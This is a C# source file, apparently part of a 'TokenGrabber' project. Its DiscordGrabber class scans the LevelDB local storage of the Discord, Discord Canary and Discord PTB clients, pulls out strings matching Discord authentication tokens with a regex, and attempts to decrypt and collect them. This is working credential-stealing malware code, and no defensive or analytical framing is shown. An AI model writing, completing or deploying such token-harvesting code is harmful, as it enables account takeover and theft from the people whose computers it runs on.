namespace TokenGrabber.Grabbers;

using System.Text.RegularExpressions;
using TokenGrabber.Discord;
using TokenGrabber.Models;
using TokenGrabber.Utils;

internal sealed partial class DiscordGrabber : ITokenGrabber
{
    private static readonly string[] DiscordPaths =
    [
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary", "Local Storage", "leveldb"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb", "Local Storage", "leveldb")
    ];

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        foreach (var dbPath in DiscordPaths)
        {
            if (!Directory.Exists(dbPath)) continue;

            var entries = LevelDbParser.ReadAllEntries(dbPath);
            foreach (var entry in entries)
            {
                var matches = TokenRegex().Matches(entry.Value);
                foreach (Match match in matches)
                {
                    var raw = match.Value;
                    var decrypted = TokenDecryptor.TryDecrypt(raw);
                    var token = decrypted ?? raw;

                    tokens.Add(new GrabbedToken
                    {
                        Token = token,
                        Platform = "Discord",
                        Source = Path.GetDirectoryName(dbPath) ?? "discord",
                        ExtractedAt = DateTime.UtcNow
                    });
                }
            }
        }

        return tokens.DistinctBy(t => t.Token).ToList();
    }

    [GeneratedRegex(@"[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}", RegexOptions.Compiled)]
    private static partial Regex TokenRegex();
}

internal interface ITokenGrabber
{
    List<GrabbedToken> Extract();
}
